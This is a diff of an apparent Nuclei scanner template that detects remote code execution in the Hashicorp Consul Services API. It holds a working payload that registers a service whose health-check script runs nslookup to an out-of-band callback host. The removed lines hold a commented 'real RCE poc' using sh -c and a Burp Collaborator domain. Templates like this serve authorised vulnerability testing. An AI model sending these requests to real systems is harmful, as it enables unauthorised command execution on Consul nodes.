@@ -1,53 +1,42 @@
-id: hasicorp-consul-rce
+id: hashicorp-consul-rce
+
 info:
-  name: Hashicorp Consul RCE
-  risk: Potential
+  name: Hashicorp Consul Services API - Remote Code Execution
+  author: pikpikcu
+  severity: critical
+  description: Hashicorp Consul Services API is vulnerable to an attack that can be leveraged to perform remote command execution on Consul nodes.
+  reference:
+    - https://www.exploit-db.com/exploits/46074
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cwe-id: CWE-77
+  metadata:
+    max-request: 1
+  tags: hashicorp,rce,oast,intrusive,edb
 
-params:
-  - root: "{{.BaseURL}}"
-  - dest: "t3xc2xpi6jd3rwpz7jgc4w4s2j8dw2.burpcollaborator.net"
+http:
+  - raw:
+      - | # Create USER
+        PUT /v1/agent/service/register HTTP/1.1
+        Host: {{Hostname}}
 
-variables:
-  - ran: RandomString(6)
+        {
+          "ID": "{{randstr}}",
+          "Name": "{{randstr}}",
+          "Address": "127.0.0.1",
+          "Port": 80,
+          "check": {
+            "script": "nslookup {{interactsh-url}}",
+            "interval": "10s",
+            "Timeout": "86400s"
+          }
+        }
 
-requests:
-  - method: GET
-    redirect: false
-    url: >-
-      {{.root}}/v1/agent/self
-    headers:
-      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
-    detections:
-      - >-
-        StatusCode() == 200 && (StringSearch("body", '"EnableScriptChecks":true') || StringSearch("body", '"EnableRemoteScriptChecks":true') || StringSearch("body", '"DisableRemoteExec":false'))
-  ### below is real RCE poc
-  # - method: PUT
-  #   redirect: false
-  #   url: >-
-  #     {{.root}}/v1/session/create
-  #   headers:
-  #     - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
-  #     - X-Consul-Token: ''
-  #   body: |
-  #     {"ID":"{{.ran}}","Name":"{{.ran}}","Address":"127.0.0.1","Port":80,"check":{"script":"nslookup {{.Domain}}.{{.dest}}","interval":"10s"}}
-  #   detections:
-  #     - >-
-  #       StatusCode() == 200 && (StringSearch("body", '"EnableScriptChecks":true') || StringSearch("body", '"EnableRemoteScriptChecks":true') || StringSearch("body", '"DisableRemoteExec":false'))
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
 
-  # - method: PUT
-  #   redirect: false
-  #   url: >-
-  #     {{.root}}/v1/agent/service/register
-  #   headers:
-  #     - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
-  #     - X-Consul-Token: ''
-  #   body: |
-  #     {"ID":"{{.ran}}","Name":"{{.ran}}","Address":"127.0.0.1","Port":80,"check":{"script":"nslookup {{.Domain}}.{{.dest}}","Args":["sh","-c","nslookup {{.Domain}}.{{.dest}}"],"interval":"10s","Timeout":"86400s"}}
-  #   detections:
-  #     - >-
-  #       StatusCode() == 200 && (StringSearch("body", '"EnableScriptChecks":true') || StringSearch("body", '"EnableRemoteScriptChecks":true') || StringSearch("body", '"DisableRemoteExec":false'))
-
-
-references:
-  - link1: https://www.exploit-db.com/exploits/46073
-  - link2: https://www.exploit-db.com/exploits/46074
+# digest: 4a0a00473045022100961929119bcf94baa1c9184093fdce9c7e88aea86c1cf9ee3f20cd126220cf7e02205c73432fecd7ad31aa1599e549761c7ba7c210ea0fdc5c4d43bb87fdab015611:922c64590222798bb761d5b6d8e72950
